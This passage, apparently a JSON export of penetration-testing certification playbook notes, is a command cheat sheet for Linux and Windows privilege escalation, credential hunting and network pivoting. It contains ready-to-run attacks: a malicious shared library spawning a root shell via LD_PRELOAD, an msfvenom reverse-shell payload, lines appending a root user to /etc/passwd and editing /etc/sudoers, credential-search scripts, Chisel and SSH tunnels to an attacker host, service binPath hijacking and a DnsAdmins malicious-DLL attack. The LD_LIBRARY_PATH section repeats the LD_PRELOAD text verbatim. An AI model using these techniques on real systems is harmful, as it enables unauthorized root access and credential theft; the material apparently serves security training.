'rpath\\|runpath'` | When a binary runs, it loads shared libraries from standard paths like:- `/lib`- `/lib64`- `/usr/lib`- `/usr/lib64`\n\nHowever, embedded metadata like `RPATH` or `RUNPATH` can redirect it to custom locations, which may be writable and exploitable. |\n| `ls -la <file>` | Our exploitation angles are:\n1. Weak permissions on `.so` files, allowing overwriting or replacement.\n2. Writable directories in the library search path, enabling creation of malicious `.so` files when the binary tries to load a library that isn’t found.\n\nCheck the permissions on the `.so` files loaded by the binary, the standard directories and any of the custom directories listed on `RPATH` or `RUNPATH`. |\n| [Create Malicious Library](https://field-manual.brunorochamoura.com/manual/post-exploitation/linux-post-exploitation/linux-privilege-escalation/shared-object-hijacking/#create-malicious-library) | If you can replace an existing `.so` file or create a missing one, compile a malicious C program as a shared object and place it in the appropriate directory where the binary expects to find it. |\n\n# **Sudo Abuse**\n\n| **Command** | **Description** |\n| --- | --- |\n| `sudo -V`\n\n[Vulnerable Sudo Versions](https://field-manual.brunorochamoura.com/manual/post-exploitation/linux-post-exploitation/linux-privilege-escalation/sudo-abuse/vulnerable-sudo-versions/) | Check if the installed sudo version is vulnerable. |\n| `sudo -l`\n[https://gtfobins.github.io/#+sudo](https://gtfobins.github.io/#+sudo) | List the current user’s sudo privileges (may prompt for password).\n\nReference GTFOBins to check if any of the binaries we can execute can be abused for privilege escalation. |\n| [LD_LIBRARY_PATH](Linux%20PrivEsc%202e0f5174ff0280a0b3f0e4766e65120f.md) \n[LD_PRELOAD](Linux%20PrivEsc%202e0f5174ff0280a0b3f0e4766e65120f.md)  | Make sure to also check for `LD_PRELOAD` and `LD_LIBRARY_PATH` environment variables, as they offer additional privilege escalation vectors. |\n\n## LD_PRELOAD\n\n`LD_PRELOAD` forces the dynamic linker to load a specified shared library before any others.\n\n| **Command** | **Description** |\n| --- | --- |\n| `sudo -l | grep LD_PRELOAD` | When reviewing a user’s `sudo` rights, look for `env_keep+=PRELOAD` in the sudoers configuration.\n\nThis setting allows the user to preserve the `LD_PRELOAD` environment variable when using `sudo`, which can be exploited to force the loading of a malicious shared library. |\n| `#include <stdio.h>\n#include <sys/types.h>\n#include <stdlib.h>\nvoid _init() {\nunsetenv(\"LD_PRELOAD\");\nsetgid(0);\nsetuid(0);\nsystem(\"/bin/bash\");\n}`\n\nTo compile it into a shared object file:\n`gcc <vulnerable-lib>.c -fPIC -shared -o /tmp/<vulnerable-lib>.so -nostartfiles` | Compile this malicious C program as a shared library (`.so`) that spawns an elevated interactive shell when loaded.\n\nPlace the compiled library in a world-writable directory (such as `/tmp`) with an arbitrary filename. |\n| `sudo LD_PRELOAD=/tmp/<vulnerable-lib>.so ...` | Run the command with `sudo` while setting `LD_PRELOAD` to the path of our malicious `.so` file.\n\nWhen the command is run, our malicious library will be loaded, triggering the payload. |\n\n## LD_LIBRARY_PATH\n\n`LD_LIBRARY_PATH` defines a list of directories the dynamic linker searches for shared libraries before the standard system paths.\n\n| **Command** | **Description** |\n| --- | --- |\n| `sudo -l | grep LD_PRELOAD` | When reviewing a user’s `sudo` rights, look for `env_keep+=PRELOAD` in the sudoers configuration.\n\nThis setting allows the user to preserve the `LD_PRELOAD` environment variable when using `sudo`, which can be exploited to force the loading of a malicious shared library. |\n| `#include <stdio.h>\n#include <sys/types.h>\n#include <stdlib.h>\nvoid _init() {\nunsetenv(\"LD_PRELOAD\");\nsetgid(0);\nsetuid(0);\nsystem(\"/bin/bash\");\n}`\n\nTo compile it into a shared object file:`gcc <vulnerable-lib>.c -fPIC -shared -o /tmp/<vulnerable-lib>.so -nostartfiles` | Compile this malicious C program as a shared library (`.so`) that spawns an elevated interactive shell when loaded.\n\nPlace the compiled library in a world-writable directory (such as `/tmp`) with an arbitrary filename. |\n| `sudo LD_PRELOAD=/tmp/<vulnerable-lib>.so ...` | Run the command with `sudo` while setting `LD_PRELOAD` to the path of our malicious `.so` file.\n\nWhen the command is run, our malicious library will be loaded, triggering the payload. |\n\n## **Vulnerable Sudo Versions**\n\n| **CVE** | **Affected Versions** | **Description** |\n| --- | --- | --- |\n| [CVE-2019-14287](https://www.exploit-db.com/exploits/47502) | ≤1.8.27 | If a `sudo` rule permits the current user to run a program as any user except root (`!root`), this restriction can be bypassed, allowing the command to be executed with root privileges anyway.\nE.g.:`(ALL, !root) /bin/bash` |\n| [CVE-2023-22809](https://www.exploit-db.com/exploits/51217)\n\nThis PoC will edit `/etc/sudoers` to make our user a super user. | 1.8.0 to 1.9.12p1 | If we have `sudoedit` rights, we can escalate privileges to `root` by editing privileged files and gaining a root shell. |\n\n# **SUID & SGID Binaries**\n\n| **Command** | **Description** |\n| --- | --- |\n| `find / -type f -perm -u=s -user root 2>/dev/null` | Finds binaries owned by `root` with SUID bit set. |\n| `find / -type f -perm -g=s -user root 2>/dev/null` | Finds binaries owned by `root` with SGID bit set. |\n| `./linpeas.sh` | [LinPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS) automatically scans for SUID and SGID binaries, highlighting those that are known to be exploitable as well as potentially custom ones. |\n| [https://gtfobins.github.io/#+suid](https://gtfobins.github.io/#+suid)[https://gtfobins.github.io/#+limited%20suid](https://gtfobins.github.io/#+limited%20suid) | To exploit known binaries, refer to GTFOBins for step-by-step usage instructions. |\n| [Shared Object Hijacking](https://field-manual.brunorochamoura.com/manual/post-exploitation/linux-post-exploitation/linux-privilege-escalation/shared-object-hijacking/)[PATH Hijacking](https://field-manual.brunorochamoura.com/manual/post-exploitation/linux-post-exploitation/linux-privilege-escalation/path-hijacking/)[Python Library Hijacking](https://field-manual.brunorochamoura.com/manual/post-exploitation/linux-post-exploitation/linux-privilege-escalation/python-library-hijacking/) | For custom binaries, additional techniques may be required to analyze and exploit potential vulnerabilities. |\n\n# **Tmux Session Hijacking**\n\nA tmux process may be left running as a privileged user, such as `root`, with weak permissions, allowing other local users to hijack the session.\n\n| **Action** | **Description** |\n| --- | --- |\n| `ps aux | grep -E 'tmux.*-S'` | Check for running tmux processes, especially those owned by root.Look for processes using the `-S` flag, which indicates a custom socket path. |\n| `ls -la <socket>` | Verifies that we can write to the socket file. If it does, we can hijack it. |\n| `tmux -S <socket>` | Attach to the tmux session.If successful, we’ll gain shell access as the user who owns the tmux process. |\n\n# **Wildcard Injection**\n\n| **Command** | **Description** |\n| --- | --- |\n| [https://gtfobins.github.io/#+shell](https://gtfobins.github.io/#+shell)[https://gtfobins.github.io/#+command](https://gtfobins.github.io/#+command) | Check if the target binary supports shell execution or arbitrary command execution via GTFOBins.If it does, and wildcard expansion is used, crafted file names may be leveraged to trigger RCE. |\n| `touch -- '--checkpoint=1'touch -- '--checkpoint-action=exec=<payload>'` | **tar**: Creates specially named files that, when matched by a wildcard in a vulnerable `tar` command, exploit parameters to execute arbitrary commands. |\n| `touch -- '-e <payload>'` | **rsync**: Creates a maliciously named file that, when included via wildcard in an `rsync` command, abuses `rsync`’s option parsing to execute arbitrary commands on the system. |\n\n# **Linux Credential Hunting**\n\n## Global\n\n| **Action** | **Description** |\n| --- | --- |\n| [Log File Finder](https://field-manual.brunorochamoura.com/manual/post-exploitation/linux-post-exploitation/linux-privilege-escalation/linux-credential-hunting/#log-file-finder) | Recursively search for shell history files from the current directory.Run as `adm` group member or with superuser privileges for best results. |\n| `ls -la /opt /var/backups /var/opt /var/mail /tmp /var/tmp` | List contents of common directories that may store sensitive or interesting files. |\n\n## **Per User**\n\n| **Action** | **Description** |\n| --- | --- |\n| `env` | View the current user’s environment variables. |\n| Go to your home directory:`cd ~`Then run:[History File Finder](https://field-manual.brunorochamoura.com/manual/post-exploitation/linux-post-exploitation/linux-privilege-escalation/linux-credential-hunting/#history-file-finder) | Recursively search for shell history files from the user’s home directory. |\n| [Password Finder](https://field-manual.brunorochamoura.com/manual/post-exploitation/linux-post-exploitation/linux-privilege-escalation/linux-credential-hunting/#password-finder) | Search files for common password patterns (`password`, `pwd`, `pass`, etc.). |\n| [Document Finder](https://field-manual.brunorochamoura.com/manual/post-exploitation/linux-post-exploitation/linux-privilege-escalation/linux-credential-hunting/#document-finder) | Locate potentially sensitive documents (e.g., `.doc`, `.pdf`, `.xls`). |\n| `grep -iE \"password|pwd|credential|pass\" ~/.??*rc 2>/dev/null` | Search for credential-related terms in shell config (`rc`) files like `.bashrc`. |\n| `python3 laZagne.py all` | Use [LaZagne](https://github.com/AlessandroZ/LaZagne) to dump saved credentials for the current user. |\n| `find . -type f -exec grep -l -I \"-----BEGIN .*PRIVATE KEY-----\" {} + 2>/dev/null` | Search recursively for PEM-encoded private keys. |\n| `watch -n 1 \"ps aux | grep pass\"` | Monitor running processes every second for command-line arguments containing potential credentials. Requires an interactive shell. |\n| `sudo tcpdump -i lo -A | grep \"pass\"` | Capture and inspect loopback network traffic in real time for leaked passwords.Requires `root`/`sudo` due to use of raw sockets. |\n\n## **Scripts**\n\n### **Log File Finder**\n\n```bash\nfor i in $(ls /var/log/* 2>/dev/null); do\n    GREP=$(grep -E \"accepted|session opened|session closed|failure|failed|ssh|password changed|new user|delete user|sudo|COMMAND=|logs\" \"$i\" 2>/dev/null)\n    if [[ $GREP ]]; then\n        echo -e \"\\n#### Log file:$i\"\n        echo '```'\n        echo \"$GREP\"\n        echo '```'\n    fi\ndone\n```\n\n### **History File Finder**\n\n```bash\nfor l in $(echo \"*_history *rc *_profile\"); do\n    echo -e \"\\nFile format: \" $l\n    find . -name $l 2>/dev/null | grep -v \"lib\\|fonts\\|share\\|core\"\ndone\n```\n\n### **Password Finder**\n\n```bash\nfind . -type f 2>/dev/null | while read -r i; do\n    MATCHES=$(grep -i \"user\\|password\\|pass|pwd\" \"$i\" 2>/dev/null)\n    if [[ $MATCHES ]]; then\n        echo -e \"\\nFile:$i\"\n        echo \"$MATCHES\"\n    fi\ndone\n```\n\n### **Document Finder**\n\n```bash\nfor ext in .xls .xls* .xltx .csv .od* .doc .doc* .pdf .pot .pot* .pp*; do\n    echo -e \"\\nFile extension:$ext\"\n    find . -name \"*$ext\" 2>/dev/null | grep -vE \"lib|fonts|share|core\"\ndone\n```\n\n# Linux PrivEsc Payloads\n\n| **Action** | **Description** |\n| --- | --- |\n| `msfvenom -p linux/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f elf -o shell.elf` | Generates a Linux x64 reverse TCP shell payload in ELF format. |\n| `echo '<username> ALL=(root) NOPASSWD: ALL' >> /etc/sudoers`\n\nTo get a `root` shell:\n`sudo su` | Grants a user passwordless root privileges via `sudo`. |\n| `echo 'r00t:$1$H5CxLMip$oSqpK92MM5tNOjlQ0nkO80:0:0:root:/root:/bin/bash' >> /etc/passwd`\n\n[Writeable /etc/passwd](https://field-manual.brunorochamoura.com/manual/post-exploitation/linux-post-exploitation/linux-privilege-escalation/passwd--shadow/writeable-etc-passwd/) | Inserts a new user to `/etc/passwd` with `root` privileges.\n\nCredentials:\n`r00t`:`brm_53cur3_p455w0rd` |\n| `cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash`\n\nTo get a shell as `root`:\n\n`/tmp/rootbash -p` | Creates a copy of the bash binary with a SUID set. |\n| `mkpasswd -m sha-512 <password>sed -i 's/^root:\\(.*\\):/root:<password-hash>:/' /etc/shadow`\n\n[Writeable /etc/shadow](https://field-manual.brunorochamoura.com/manual/post-exploitation/linux-post-exploitation/linux-privilege-escalation/passwd--shadow/writeable-etc-shadow/) | Tampers with `/etc/shadow` to replace a `root`’s password. |\n| `#include <stdio.h>\n#include <stdlib.h>\n\nint main(){\nsystem(\"PAYLOAD HERE\");\nreturn 0;\n}` | A minimal C program that executes a payload when run.\n\nCompile it to an `elf` executable with:\n`gcc <program>.c -o <executable>` |",
    "headings": [
      {
        "level": 1,
        "text": "Linux PrivEsc"
      },
      {
        "level": 1,
        "text": "Passwd & Shadow"
      },
      {
        "level": 1,
        "text": "Capability Abuse"
      },
      {
        "level": 3,
        "text": "Enumerating Capabilities"
      },
      {
        "level": 3,
        "text": "Abusing Capabilities"
      },
      {
        "level": 1,
        "text": "Cron Job Exploitation"
      },
      {
        "level": 3,
        "text": "Enumerating Cron Job"
      },
      {
        "level": 1,
        "text": "NFS no_root_squash"
      },
      {
        "level": 1,
        "text": "PATH Hijacking"
      },
      {
        "level": 3,
        "text": "SUID Binary Path Hijacking"
      },
      {
        "level": 3,
        "text": "Cronjob Path Hijacking"
      },
      {
        "level": 1,
        "text": "Privileged Groups"
      },
      {
        "level": 2,
        "text": "Adm Group"
      },
      {
        "level": 2,
        "text": "Disk Group"
      },
      {
        "level": 2,
        "text": "Docker Group"
      },
      {
        "level": 3,
        "text": "Mount Abuse on Docker group"
      },
      {
        "level": 3,
        "text": "Writable Sock on Docker Group"
      },
      {
        "level": 2,
        "text": "LXC / LXD Group"
      },
      {
        "level": 1,
        "text": "PwnKit"
      },
      {
        "level": 1,
        "text": "Python Library Hijacking"
      },
      {
        "level": 2,
        "text": "Write Permission"
      },
      {
        "level": 2,
        "text": "Library Path"
      },
      {
        "level": 2,
        "text": "PYTHONPATH"
      },
      {
        "level": 1,
        "text": "Shared Object Hijacking"
      },
      {
        "level": 3,
        "text": "Create Malicious Library"
      },
      {
        "level": 1,
        "text": "Sudo Abuse"
      },
      {
        "level": 2,
        "text": "LD_PRELOAD"
      },
      {
        "level": 2,
        "text": "LD_LIBRARY_PATH"
      },
      {
        "level": 2,
        "text": "Vulnerable Sudo Versions"
      },
      {
        "level": 1,
        "text": "SUID & SGID Binaries"
      },
      {
        "level": 1,
        "text": "Tmux Session Hijacking"
      },
      {
        "level": 1,
        "text": "Wildcard Injection"
      },
      {
        "level": 1,
        "text": "Linux Credential Hunting"
      },
      {
        "level": 2,
        "text": "Global"
      },
      {
        "level": 2,
        "text": "Per User"
      },
      {
        "level": 2,
        "text": "Scripts"
      },
      {
        "level": 3,
        "text": "Log File Finder"
      },
      {
        "level": 3,
        "text": "History File Finder"
      },
      {
        "level": 3,
        "text": "Password Finder"
      },
      {
        "level": 3,
        "text": "Document Finder"
      },
      {
        "level": 1,
        "text": "Linux PrivEsc Payloads"
      }
    ],
    "commands": [
      {
        "language": "c",
        "code": "#include <stdlib.h>\n#include <unistd.h>\n\n__attribute__((constructor)) void run_on_load() {\n    setuid(0);\n    system(\"/bin/bash -p\");\n}"
      },
      {
        "language": "bash",
        "code": "for i in $(ls /var/log/* 2>/dev/null); do\n    GREP=$(grep -E \"accepted|session opened|session closed|failure|failed|ssh|password changed|new user|delete user|sudo|COMMAND=|logs\" \"$i\" 2>/dev/null)\n    if [[ $GREP ]]; then\n        echo -e \"\\n#### Log file:$i\"\n        echo '"
      },
      {
        "language": "bash",
        "code": "### **History File Finder**"
      },
      {
        "language": "bash",
        "code": "### **Password Finder**"
      },
      {
        "language": "bash",
        "code": "### **Document Finder**"
      }
    ],
    "tags": [
      "hashcat",
      "linpeas",
      "gtfobins",
      "rce",
      "privesc",
      "sudo",
      "suid"
    ],
    "size": 35740,
    "lineCount": 562
  },
  {
    "id": "cpts-playbook-lateral-movement-pivoting-2edf5174ff02800d845afc455baba241",
    "title": "Pivoting",
    "category": "CPTS Field Playbooks",
    "subcategory": "CPTS Playbook / Lateral Movement",
    "filePath": "CPTS Playbook/Lateral Movement/Pivoting 2edf5174ff02800d845afc455baba241.md",
    "content": "# Pivoting\n\n```\nNeed to access internal network? → How much access needed?\n    │\n    ├─► Single port/service → SSH/Chisel\n    │\n    ├─► Multiple ports, TCP only → Chisel SOCKS\n    │\n    ├─► Full network, UDP needed → Ligolo-ng\n    │\n    ├─► AD environment, many tools → Ligolo-ng\n    │\n    └─► Quick and simple → SSH\n```\n\n# **Pivoting Reconnaissance**\n\n> It’s good to attempt our ping sweep at least twice. It’s possible that a ping sweep may not result in successful replies on the first attempt, especially when communicating across networks.\n> \n\n## In Linux\n\n| **Action** | **Description** |\n| --- | --- |\n| `ifconfig` | Displays the current network configuration. Useful for identifying multiple network adapters. |\n| `for i in {1..254}; do (ping -c 1 XXX.XXX.XXX.$i | grep \"bytes from\" &) ; done` | Performs a ping sweep from the command line. Modify the IP range as needed.Increase the `-c` value to send more probes if hosts appear to be missed. |\n| `for i in {1..254}; do nc -vz -w 1 XXX.XXX.XXX.$i <port> 2>&1 | grep succeeded; done` | Performs a port sweep from the command line. Modify the IP range as needed. |\n| `./nmap ...` | You can upload a static Nmap binary to the compromised host and use it to scan the network. |\n| `netstat -r` | Displays the system’s routing table. May reveal additional IP addresses or reachable networks. |\n\n## In Windows\n\n| **Action** | **Description** |\n| --- | --- |\n| `ipconfig` | Displays current network settings. Look for multiple network interfaces. |\n| `for /L %i in (1,1,254) do ping XXX.XXX.XXX.%i -n 1 -w 100 | find \"Reply\"` | Conducts a basic ping sweep.Update the IP range as needed. Output formatting may vary. Increase the `-n` value for more probes if necessary. |\n| `1..254 | ForEach-Object { if (Test-Connection -ComputerName \"XXX.XXX.XXX.$_\" -Count 1 -Quiet) { Write-Host \"XXX.XXX.XXX.$_ is reachable\" } else { Write-Host \"XXX.XXX.XXX.$_ is unreachable\" } }` | Executes a ping sweep using PowerShell.Adjust the IP range as required. This can be slow. |\n| `netstat -r` | Displays the system’s routing table. May reveal additional IP addresses or reachable networks. |\n\n# **Local Port Forwarding**\n\n## With SSH\n\n| **Command** | **Description** |\n| --- | --- |\n| `ssh ... -L 0.0.0.0:<proxy-port>:<target-ip>:<target-port>` | **(Attack)** If you have SSH access, it’s often easiest to use this method. Once set up, you can access the remote service locally. |\n| Start SSH service on the attack host:\n`sudo systemctl start ssh`\n\nConnect from the proxy to the attack host:\n`ssh ... -R 0.0.0.0:<proxy-port>:<target-ip>:<target-port> sshuser@<attack-ip>` | **(Proxy)** Alternatively, if the proxy doesn’t have a listening SSH service, we can do a remote port forward.The proxy host connects via SSH to the attack host, but otherwise everything is exactly the same. |\n\n> If you don’t want the SSH shell session, use `-N` flag.\n> \n\n## With Chisel\n\nChisel works by transporting SSH traffic over HTTP, so this works as HTTP tunneling as well.\n\n| **Command** | **Description** |\n| --- | --- |\n| `chisel server -v --socks5 --reverse -p <chisel-server-port>` | **(Attack)** Starts a reverse Chisel server on the ttacking machine.The output will include a fingerprint, which is required for setting up the client. |\n| `chisel client --fingerprint <fingerprint> <attack-ip>:<chisel-server-port> R:<proxy-port>:<target-ip>:<target-port>` | **(Proxy)** Establishes a Chisel client on the target that connects back to the attacker’s server.\n\nThe Chisel binary must be transferred to the proxy host. |\n\n## With Socat\n\n| **Action** | **Description** |\n| --- | --- |\n| `socat -ddd TCP-LISTEN:<proxy-port>,fork TCP:<target>:<target-port>` | **(Proxy)** The `socat` binary can be often found on Linux systems.In which case, we can use it to port forward without loading additional tools on the proxy. |\n\n# **Dynamic Port Forwarding**\n\n## With Proxychains\n\n| **Action** | **Description** |\n| --- | --- |\n| Add this line:\n`socks5 127.0.0.1 1080` | We need to edit the `/etc/proxychains4.conf` file so Proxychains can locate our SOCKS proxy and recognize its type.\n\nJust replace any existing proxy entry at the end of the file with a line specifying the proxy type and address. |\n| `proxychains ...` | To interact with the hosts via CLI, prefix the command with `proxychains` to route the traffic through the proxy.\n\nUse the `-q` flag if you don’t want `proxychains` to output debug information. |\n\n## With SSH\n\n| **Action** | **Description** |\n| --- | --- |\n| `ssh ... -D 0.0.0.0:1080` | **(Attack)** Starts a SOCKS proxy over SSH on port 1080. |\n| For this to work, the SSH client version should be 7.6 or above:\n`ssh -V`\n\nStart SSH service on the attack host:\n`sudo systemctl start ssh`\n\nConnect from the proxy to the attack host:\n`ssh ... -R 1080 sshuser@<attack-ip>` | **(Proxy)** Alternatively, if the proxy doesn’t have a listening SSH service, we can do a remote port forward.\n\nThe proxy host connects via SSH to the attack host, but otherwise everything is exactly the same. |\n\n## With Chisel\n\n| **Action** | **Description** |\n| --- | --- |\n| `chisel server -v --socks5 --reverse -p <chisel-server-port>` | **(Attack)** Creates a reverse Chisel server.\n\nThis will output a fingerprint, which we’ll need to setup the client. |\n| `chisel client --fingerprint <fingerprint> <attack-ip>:<chisel-server-port> R:socks` | **(Proxy)** Creates a Chisel client that connects back to the attack’s server.\n\nThe Chisel binary must be transferred to the proxy host. |\n\nTo open a host’s website via the browser, use Firefox with the FoxyProxy extension:\n\n![image.png](Pivoting/image.png)\n\n> SOCKS proxies do not support raw packet features. Stealth scans (like `-sS`) won’t work with `proxychains`. Use `-sT` instead, even with `sudo`.\n> \n\n> SOCKS proxies do not support ICMP traffic. That means `ping` won’t work when using `proxychains`.\n> \n\n# **Reverse Port Forwarding**\n\n## With Chisel\n\n| **Action** | **Description** |\n| --- | --- |\n| `chisel client --fingerprint <fingerprint> <attack-ip>:<chisel-server-port> 0.0.0.0:<reverse-port>:<attack-ip>:<reverse-port>` | **(Attack)** Creates a reverse Chisel server.This will output a fingerprint, which we’ll need to setup the client. |\n| `chisel client --fingerprint <fingerprint> <attack-ip>:<chisel-server-port> 0.0.0.0:<reverse-port>:<attack-ip>:<reverse-port>` | **(Proxy)** Creates a Chisel client that connects back to the attack’s server.\n\nThe Chisel binary must be transferred to the proxy host. |\n\n## With SSH\n\n| Action | **Description** |\n| --- | --- |\n| `ssh -N -R 4444:localhost:4444 attacker@your-vps` | On compromised host: Creates reverse tunnel from local port 4444 to attacker's VPS port 4444 |\n\n# **Proxy Chaining**\n\n> For this technique to work, we assume that a [Dynamic Port Forwarding](https://field-manual.brunorochamoura.com/manual/lateral-movement/pivoting/dynamic-port-forwarding/) connection is already established between **Attack** and **Proxy 1**. This serves as the first link in the proxy chain and forms the foundation for adding more proxies further into the network.\n> \n\n| **Command** | **Description** |\n| --- | --- |\n| `chisel server -v --socks5 --reverse -p <chisel-server-port>` | **(Proxy 1)** Starts a reverse Chisel server with SOCKS5 support.\n\nUse a unique port that’s not used by other servers (on any host).\n\nThis command will output a fingerprint required for the client setup.\n\nEnsure the Chisel client already running on Proxy 1 stays active. |\n| `chisel client --fingerprint <fingerprint> <proxy-1-internal-ip>:<chisel-server-port> R:2080:socks` | **(Proxy 2)** Launches a Chisel client that connects to Proxy 1’s server.\n\nWe use port `2080` here since this is the second proxy in the chain (use `3080` for the third, `4080` for the fourth, etc.). |\n| Example for two hops:\n`socks5 127.0.0.1 1080socks5 127.0.0.1 2080`\n\nIf we we added our third connection, we’d need add a `3080` line and so forth. | **(Attack)** Edit `/etc/proxychains4.conf` to include the newly added connection. |",
    "headings": [
      {
        "level": 1,
        "text": "Pivoting"
      },
      {
        "level": 1,
        "text": "Pivoting Reconnaissance"
      },
      {
        "level": 2,
        "text": "In Linux"
      },
      {
        "level": 2,
        "text": "In Windows"
      },
      {
        "level": 1,
        "text": "Local Port Forwarding"
      },
      {
        "level": 2,
        "text": "With SSH"
      },
      {
        "level": 2,
        "text": "With Chisel"
      },
      {
        "level": 2,
        "text": "With Socat"
      },
      {
        "level": 1,
        "text": "Dynamic Port Forwarding"
      },
      {
        "level": 2,
        "text": "With Proxychains"
      },
      {
        "level": 2,
        "text": "With SSH"
      },
      {
        "level": 2,
        "text": "With Chisel"
      },
      {
        "level": 1,
        "text": "Reverse Port Forwarding"
      },
      {
        "level": 2,
        "text": "With Chisel"
      },
      {
        "level": 2,
        "text": "With SSH"
      },
      {
        "level": 1,
        "text": "Proxy Chaining"
      }
    ],
    "commands": [
      {
        "language": "bash",
        "code": "Need to access internal network? → How much access needed?\n    │\n    ├─► Single port/service → SSH/Chisel\n    │\n    ├─► Multiple ports, TCP only → Chisel SOCKS\n    │\n    ├─► Full network, UDP needed → Ligolo-ng\n    │\n    ├─► AD environment, many tools → Ligolo-ng\n    │\n    └─► Quick and simple → SSH"
      }
    ],
    "tags": [
      "nmap",
      "chisel",
      "ligolo",
      "sudo"
    ],
    "size": 8155,
    "lineCount": 162
  },
  {
    "id": "cpts-playbook-post-exploitation-2e0f5174ff02808abd7ece37c19b4d3c",
    "title": "Post Exploitation",
    "category": "CPTS Field Playbooks",
    "subcategory": "CPTS Playbook",
    "filePath": "CPTS Playbook/Post Exploitation 2e0f5174ff02808abd7ece37c19b4d3c.md",
    "content": "# Post Exploitation\n\n[Linux](Post%20Exploitation/Linux%202e0f5174ff02806ab747d98451cfe2ee.md)\n\n[Windows](Post%20Exploitation/Windows%202e9f5174ff02806f8264c5c47d28d3c5.md)",
    "headings": [
      {
        "level": 1,
        "text": "Post Exploitation"
      }
    ],
    "commands": [],
    "tags": [],
    "size": 171,
    "lineCount": 5
  },
  {
    "id": "cpts-playbook-post-exploitation-windows-windows-privesc-privileged-group-2e9f5174ff0280ffa69cd238e806c2c5",
    "title": "Privileged Group",
    "category": "CPTS Field Playbooks",
    "subcategory": "CPTS Playbook / Post Exploitation / Windows / Windows PrivEsc",
    "filePath": "CPTS Playbook/Post Exploitation/Windows/Windows PrivEsc/Privileged Group 2e9f5174ff0280ffa69cd238e806c2c5.md",
    "content": "# Privileged Group\n\n## **Backup Operators**\n\n| **Actions** | **Description** |\n| --- | --- |\n| `diskshadow.exe`\n\nCommands:\n`set verbose on\nset metadata C:\\Windows\\Temp\\meta.cab\nset context clientaccessible\nset context persistent\nbegin backup\nadd volume C: alias cdrive\ncreateexpose %cdrive% E:\nend backup\nexit\ndir E:`\n\nCopy `NTDS.dit` from the shadow volume:\n`robocopy /B E:\\Windows\\NTDS . ntds.dit\nCopy-FileSeBackupPrivilege E:\\Windows\\NTDS\\ntds.dit <output-path>` | Members of the Backup Operators group are able to log in locally to their Domain Controller, which enables them to copy the `NTDS.dit` file by leveraging the `SeBackupPrivilege` or `SeRestorePrivilege` privilege. |\n| `$base64 = \"<base64-encoded-commands>\"\n\n[System.Text.Encoding]::ASCII.GetString([Convert]::FromBase64String($base64)) | Out-File -Encoding ASCII commands.txt\n\ndiskshadow.exe /s commands.txt` | In unstable shells where `diskshadow.exe` can’t be run interactively, you must provide a file containing all the commands instead of entering them one by one. |\n\n> [SeBackup & SeRestore](https://field-manual.brunorochamoura.com/manual/post-exploitation/windows-post-exploitation/windows-privilege-escalation/user-privileges/sebackup--serestore/): Additional techniques enabled by these privileges.\n> \n\nMembers of this group have the `SeBackupPrivilege` and `SeRestorePrivilege` privileges by default, allowing them to bypass file and folder permissions to back up and restore data, granting them read and write access to virtually all files on a system.\nAn attacker with access to this group can read sensitive files, such as the SAM database or `SYSTEM` registry hive, or replace trusted executables, potentially gaining `SYSTEM`-level access.\n\n## **Print Operators**\n\nThe Print Operators group in Windows is a built-in local group with specific administrative privileges related to managing printers.\n\nOne notable privilege held by this group is the `SeLoadDriverPrivilege`, which allows members to load and unload device drivers on the system. This privilege can be used to escalate privileges to `SYSTEM` on some versions of Windows.\n\n## **Server Operators**\n\nThe Server Operators group enables members to manage Windows servers without requiring Domain Administrator rights. This group holds significant privileges, allowing members to log into servers, including Domain Controllers.\n\nMembers of this group are granted the `SeBackupPrivilege` and `SeRestorePrivilege` privileges, along with the ability to control local services.\n\n| **Action** | **Description** |\n| --- | --- |\n| Make note of `BINARY_PATH_NAME`:\n\n`sc qc AppReadiness` | We can leverage the ability to tamper local services that run as `SYSTEM` to achieve RCE.\n\nThe `AppReadiness` service is a good candidate. |\n| `.\\PsService.exe security AppReadiness` | We can use [PsService](https://learn.microsoft.com/pt-pt/sysinternals/downloads/psservice), which is part of the Sysinternals suite, to check the permissions on the service.\n\nCheck the `Server Operators` section. It should be `All`. |\n| `sc config AppReadiness binPath= \"cmd.exe /c <payload>\"` | Change the binary path to execute a malicious command instead. |\n| `sc start AppReadiness` | Start the service to trigger the payload.\n\nStarting the service should fail, which is expected since we tampered with the binary path. |\n| `sc config AppReadiness binPath= \"<old-bin-path>\"` | Clean up after ourselves by changing the binary path back to the original one. |\n\n## **DNS-Admins**\n\n### Malicious DLL\n\n| **Action** | **Description** |\n| --- | --- |\n| `dnscmd.exe /config /serverlevelplugindll <payload-full-path>.dll` | Loads a malicious `.dll` to be used by the DNS service.\n\nWe must specify the full path to the custom DLL, or the attack will fail. |\n| `wmic useraccount where name=\"<username>\" get sidsc.exe sdshow DNS` | Retrieves the SID of the `dnsadmin` user and checks their permissions on the DNS service.Search the output of `sc.exe sdshow DNS` for the SID.\n\nWe’re looking for `(A;;RPWP;;;<SID>)`, as this grants full read/write permissions. |\n| Restart:\n`sc stop dns\nsc start dns`\n\nCheck status:\n`sc query dns` | Restarts the DNS service, if we have the necessary permissions, triggering the payload.\n\nKeep in mind that the malicious `.dll` will prevent DNS from starting properly. |\n| `sc.exe stop dns\n\nreg query \\\\<host-ip>\\HKLM\\SYSTEM\\CurrentControlSet\\Services\\DNS\\Parameters\n\nreg delete \\\\<host-ip>\\HKLM\\SYSTEM\\CurrentControlSet\\Services\\DNS\\Parameters /v ServerLevelPluginDll\n\nsc.exe start dns` | Make sure to cleanup after the attack to resume normal service functionality.\n\nStop the DNS service, confirm the existence of the `ServerLevelPluginDll` key, delete it, and restart the service.\n\nThis step should be done from an admin terminal. |\n\n### Malicious WPAD Record\n\n| **Action** | **Description** |\n| --- | --- |\n| `Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName <dc-fqdn>` | Disables the global query block list on the DNS server, which by default blocks WPAD-based attacks. |\n| `Add-DnsServerResourceRecordA -Name wpad -ZoneName <domain> -ComputerName <netbios_name>.<domain> -IPv4Address <attack-machine>` | Adds a WPAD record that points to the attacker’s machine. |\n| [LLMNR & NBT-NS Poisoning](https://field-manual.brunorochamoura.com/manual/lateral-movement/windows-lateral-movement/llmnr--nbt-ns-poisoning/)\n\n[SMB Net-NTLM Relay](https://field-manual.brunorochamoura.com/manual/lateral-movement/windows-lateral-movement/smb-net-ntlm-relay/) | Use tools like Responder or Inveigh to spoof traffic. This allows for capturing password hashes, performing offline cracking, or conducting an SMBRelay attack. |\n\n## **Event Log Readers**\n\nUsers in the Event Log Readers group can read system logs without needing full administrator rights.\n\nSometimes, system administrators may assign this access to power users or developers to let them 